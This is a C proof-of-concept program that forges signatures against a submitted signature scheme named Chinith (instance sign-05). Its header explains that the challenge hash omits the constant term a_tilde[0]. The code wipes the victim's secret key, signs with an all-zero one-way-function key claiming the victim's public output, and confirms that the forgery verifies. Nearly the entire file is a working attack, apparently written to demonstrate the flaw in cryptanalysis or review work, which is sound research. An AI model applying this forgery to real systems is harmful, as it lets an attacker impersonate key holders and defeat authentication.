/*
 * Public-key-only universal forgery for Chinith (sign-05).
 *
 * The submitted hash_challenge_3_init() absorbs chall_2 and a_tilde[1..d-1]
 * but not the QuickSilver constant term a_tilde[0], so the verifier's
 * reconstruction of a_tilde[0] -- the only value that depends on whether the
 * committed witness satisfies the public OWF relation -- never reaches the
 * acceptance decision.  An ordinary signer run on a false witness therefore
 * produces a signature that verifies under the victim's public key.
 *
 * The victim key pair comes from the public sig_keygen(); its secret key is
 * wiped immediately.  The forger builds an unpacked private key containing
 * the victim's public OWF input and output, an all-zero OWF key and the
 * extended witness of that zero key, and runs the instance's own unpacked
 * signer.  The result is checked with the public sig_verify().
 *
 * Build with `make -C sign-05 exploit`; INST selects the parameter set.
 */
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#include "link_common.h"
#include "link_sig.h"

#define CAT_(a, b) a##b
#define CAT(a, b) CAT_(a, b)
#define STR_(a) #a
#define STR(a) STR_(a)
#define HDR STR(INST.h)
#include HDR

#define UNPACKED_T     CAT(INST, _unpacked_private_key_t)
#define UNPACK         CAT(INST, _unpack_private_key)
#define UNPACKED_SIGN  CAT(INST, _unpacked_sign_with_randomness)
#define CLEAR_UNPACKED CAT(INST, _clear_unpacked_private_key)

unsigned long long sig_get_pk_len_bytes(void);
unsigned long long sig_get_sk_len_bytes(void);
unsigned long long sig_get_sn_len_bytes(void);
int sig_keygen(unsigned char *pk, unsigned long long *pk_len_bytes,
               unsigned char *sk, unsigned long long *sk_len_bytes);
int sig_verify(unsigned char *pk, unsigned long long pk_len_bytes,
               unsigned char *sn, unsigned long long sn_len_bytes,
               unsigned char *m, unsigned long long m_len_bytes);

int main(void)
{
    static unsigned char pk[256], sk[256], fake_sk[256], sig[1 << 17];
    unsigned char seed[48], rho[32], msg[] = "Chinith sign-05 forged message";
    unsigned long long pk_len = sig_get_pk_len_bytes(), sk_len = sig_get_sk_len_bytes();
    unsigned long long sn_len = sig_get_sn_len_bytes();
    const char *name = STR(INST);
    UNPACKED_T u;

    for (size_t i = 0; i < sizeof(seed); i++) seed[i] = (unsigned char)(0xa5 ^ i);
    for (size_t i = 0; i < sizeof(rho); i++) rho[i] = (unsigned char)(0x3c + i);
    if (pk_len > sizeof(pk) || sk_len > sizeof(sk) || sn_len > sizeof(sig) ||
        ngcc_seed(seed, sizeof(seed)) != 0 || sig_keygen(pk, &pk_len, sk, &sk_len) != 0) {
        printf("ERROR  sign-05 %s: key generation failed\n", name);
        return 2;
    }
    memset(sk, 0, sizeof(sk));  /* the forger never sees the secret key */

    /* public OWF input taken from pk; the OWF key is all zero */
    const size_t in_len = sizeof(u.owf_input), out_len = sizeof(u.owf_output);
    memset(fake_sk, 0, sizeof(fake_sk));
    memcpy(fake_sk, pk, in_len);
    if (in_len + out_len != pk_len || UNPACK(&u, fake_sk) != 0) {
        printf("ERROR  sign-05 %s: unexpected key layout\n", name);
        return 2;
    }
    if (memcmp(u.owf_output, pk + in_len, out_len) == 0) {
        printf("ERROR  sign-05 %s: zero key is a genuine preimage\n", name);
        return 2;
    }
    memcpy(u.owf_output, pk + in_len, out_len);  /* claim the victim's output */

    clock_t t0 = clock();
    size_t sig_len = sn_len;
    int rc = UNPACKED_SIGN(&u, msg, sizeof(msg) - 1, rho, sizeof(rho), sig, &sig_len);
    double forge_s = (double)(clock() - t0) / CLOCKS_PER_SEC;
    CLEAR_UNPACKED(&u);
    if (rc != 0 || sig_len != sn_len) {
        printf("ERROR  sign-05 %s: signer failed\n", name);
        return 2;
    }

    int ok = sig_verify(pk, pk_len, sig, sn_len, msg, sizeof(msg) - 1);
    msg[0] ^= 1;
    int flipped = sig_verify(pk, pk_len, sig, sn_len, msg, sizeof(msg) - 1);

    printf("sign-05 %s: forged %llu-byte signature in %.3f s; verify=%d, "
           "one-bit message change verify=%d\n", name, sn_len, forge_s, ok, flipped);
    if (ok == 0 && flipped != 0) {
        printf("ATTACK sign-05-1 %s CONFIRMED: public-key-only forgery accepted\n", name);
        return 0;
    }
    printf("FAIL   sign-05-1 %s: forgery not accepted\n", name);
    return 1;
}
